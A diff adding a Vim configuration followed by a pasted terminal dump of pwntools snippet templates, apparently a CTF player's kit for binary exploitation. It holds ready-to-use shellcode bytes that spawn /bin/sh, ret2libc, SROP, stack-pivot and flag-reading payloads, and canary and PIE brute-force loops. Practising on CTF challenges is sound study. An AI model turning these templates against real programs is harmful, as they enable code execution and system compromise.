@@ -1,0 +1,238 @@
+set nocompatible
+filetype off
+set rtp+=~/.vim/bundle/Vundle.vim
+call vundle#begin()
+Plugin 'VundleVim/Vundle.vim'
+"Plugin 'davidhalter/jedi-vim'
+" python模块补全 例如 os.
+Plugin 'vim-scripts/indentpython.vim'
+" " python自动缩进
+Plugin 'Yggdroot/indentLine'
+" " 缩进指示线
+"snippet
+Plugin 'MarcWeber/vim-addon-mw-utils'
+Plugin 'tomtom/tlib_vim'
+Plugin 'garbas/vim-snipmate'
+Plugin 'SirVer/ultisnips'
+"Optional:
+Plugin 'honza/vim-snippets'
+
+
+
+
+
+
+call vundle#end()
+filetype plugin indent on
+set nu
+filetype plugin on 
+"let g:pydiction_location = '~/.vim/bundle/pydiction/complete-dict' 
+"et g:pydiction_menu_height = 3
+
+"set dictionary+=/usr/share/dict/words
+
+
+
+
+
+
+
+
+
+
+==============================================================================
+
+
+
+
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ cat ~/.vim/UltiSnips/python.snippets 
+#gdb.att
+snippet atta
+gdb.attach(io)
+pause()
+endsnippet
+#fmt
+snippet fmt
+#fmtstr_payload(,{addr:v}) 
+fmtstr_payload(,{addr:v},numbwritten=0,write_size='short')# int short byte 
+endsnippet
+#mb
+snippet mb
+from pwn import *
+from LibcSearcher import *
+context.terminal=['tmux','splitw','-h']
+context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
+#context(os='linux', arch='i386', kernel='i386',log_level='debug')
+#io=gdb.debug('./pwn')
+io=process('./pwn')
+#io=remote('node4.buuoj.cn',)
+s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
+r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
+ii=io.interactive
+def lg(var):
+        for name, value in globals().items():
+                if value is var:
+                        log.info(f"{name} => {hex(var)}")
+                        return
+ru(b'')
+payload1=
+ii()
+endsnippet
+#libc
+snippet libcmb
+elf=ELF('./pwn')
+libc=('./libc.so.6')
+addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+#addr=u32(io.recvuntil(b'\xf7')[-4:])
+#ru(b'0x')
+#rbp= int(io.recv(12).rjust(16,b'0'),16)
+#print(hex(rbp))
+print(hex(addr))
+libc_base_addr=addr-libc.sym['read']
+system_addr=libc_base_addr+ libc.sym['system']
+bin_sh_addr=libc_base_addr+ next(libc.search(b'/bin/sh\x00'))
+endsnippet
+#libcmb2
+snippet libcmb2 
+elf=ELF('./pwn')
+libc=('./libc.so.6')
+addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+#addr=u32(io.recvuntil(b'\xf7')[-4:])
+#ru(b'0x')
+#rbp= int(io.recv(12).rjust(16,b'0'),16)
+#print(hex(rbp))
+print(hex(addr))
+libc=LibcSearcher('printf',printf_addr)
+libc_base_addr=addr-libc.dump('printf')
+system_addr=libc_base_addr+libc.dump('system')
+bin_sh_addr=libc_base_addr+libc.dump('str_bin_sh')
+endsnippet
+#rd
+snippet rd
+addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+#addr=u32(io.recvuntil(b'\xf7')[-4:])
+#ru(b'0x')
+#rbp= int(io.recv(12).rjust(16,b'0'),16)
+#print(hex(rbp))
+endsnippet
+#rc
+snippet rc
+rl(b'0x')
+canary = int(io.recv(16), 16)
+endsnippet
+#shell
+snippet 3shell
+shellcode=asm(shellcraft.i386.sh())
+endsnippet
+#6shell
+snippet shell
+shellcode=asm(shellcraft.sh())
+endsnippet
+#bshell
+snippet bshell
+# 32位 短字节shellcode --> 21字节
+#\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+# 32位 纯ascii字符shellcode
+#PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA
+
+# 32位 scanf可读取的shellcode
+#\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh
+
+# 64位 scanf可读取的shellcode 22字节
+#\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
+
+# 64位 较短的shellcode  23字节
+#\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
+
+# 64位 纯ascii字符shellcode
+#Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
+
+endsnippet
+#sig
+snippet sig
+frame=SigreturnFrame()
+frame.rax=constants.SYS_execve
+frame.rdi=binsh_addr
+frame.rsi=0
+frame.rdx=0
+frame.rip=sys_add   
+#15号系统调用恢复寄存器
+payload2=b'/bin/sh\x00'*2+p64(mov_rax_15)+p64(sys_add)+bytes(frame)
+endsnippet
+#elf.got[''] eg
+snippet eg
+elf.got['']
+
+endsnippet
+#elf.plt['']
+snippet ep
+elf.plt['']
+endsnippet
+#es
+snippet es
+elf.sym['']
+endsnippet
+#lg
+snippet lg
+libc.got['']
+endsnippet
+#ep
+snippet lp
+libc.plt['']
+endsnippet
+#es
+snippet ls
+libc.sym['']
+endsnippet
+#elf 
+snippet elf=
+elf=ELF('./pwn')
+endsnippet
+#search
+snippet search
+next(libc.search(b'/bin/sh\x00'))
+endsnippet
+#栈迁移
+snippet qy
+p2=b'this rbp'+p64(rdi)+p64(rbp-0x30)+p64(ret)+p64(system)+b'this bin'+b'/bin/sh\x00'
+p2=p2.ljust(0x60-8-8,b'a')+p64(rbp-0x60)+p64(leave)
+endsnippet
+#payload
+snippet p
+payload=
+endsnippet
+#row
+snippet orw
+ad=0x0804A060+0x100
+payload=shellcraft.open('./flag',0)
+payload+=shellcraft.read('eax','esp',0x50)  #/3
+payload+=shellcraft.write(1,'esp',0x50)
+payload+=shellcraft.exit(0)
+payload=asm(payload)
+endsnippet
+#cess
+snippet cess
+seccomp-tools dump ./pwn
+endsnippet
+#cannry&&pie
+snippet canary
+canary=b'\x00'
+for j in range(7):
+        for i in range(0x100):
+                s(b'a'*0x68+canary+bytes([i]))
+                a=ru(b'welcome\n')
+                if b'have fun' in a:
+                        canary+=bytes([i])
+                        print(hex(u64(canary.ljust(8,b'\x00') ) ) )
+                        break
+print(hex(u64(canary)))
+list1 = [b"\x02", b"\x12", b"\x22", b"\x32", b"\x42", b"\x52", b"\x62", b"\x72", b"\x82", b"\x92", b"\xa2", b"\xb2", b"\xc2", b"\xd2", b"\xe2", b"\xf2"]
+for chosen_byte in list1:
+addr=b'\x28'+chosen_byte 
+s(b'a'*0x68+canary+b'a'*8+addr)
+sleep(1)
+ii()
+endsnippet
+
